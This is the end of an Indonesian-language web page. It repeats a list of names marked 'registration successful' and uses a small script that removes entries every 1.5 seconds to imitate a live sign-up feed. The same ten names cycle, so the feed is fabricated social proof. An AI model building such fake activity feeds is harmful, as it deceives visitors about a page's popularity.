                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              </div>
              <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r1.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r1.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Ahmad Fauzi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r2.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Siti Aminah</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r3.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Budi Santoso</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r4.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Dewi Lestari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r5.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Andi Prasetyo</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r6.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Rina Hapsari</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r7.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Joko Susanto</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r8.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Fitriani Melati</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r9.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              <span class="name">Eko Wahyudi</span>
              <span class="text">Pendaftaran Berhasil <img src="https://www.svgrepo.com/show/395995/check-mark-button.svg" style="height: 16px;" /></span>
          </div>
        </div>
                <div class="tests" style="display: flex;gap: 15px;">
          <img src="img/r10.jpg" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;" />
          <div>
              </div>
      <img src="img/footer.webp" class="w-100" style="object-fit: cover;aspect-ratio: 9/1.5;" />
    </div>
    <footer class="mt-5 bg-success py-5">
      <div style="width: 100%;max-width: 800px;margin: auto;color: #FFF;" class="d-flex justify-content-between">
        <span>2024 All Rights Reserved</span>
        <span style="font-size: 18px;display: flex;gap: 17px;">
          <i class="fa fa-shield"></i>
          <i class="fa fa-home"></i>
          <i class="fa fa-envelope-o"></i>
        </span>
      </div>
    </footer>
    <script>
      setInterval(function(){
        $(".tests:first-child").remove();
      }, 1500);
    </script>
  </div>
</body>
</html>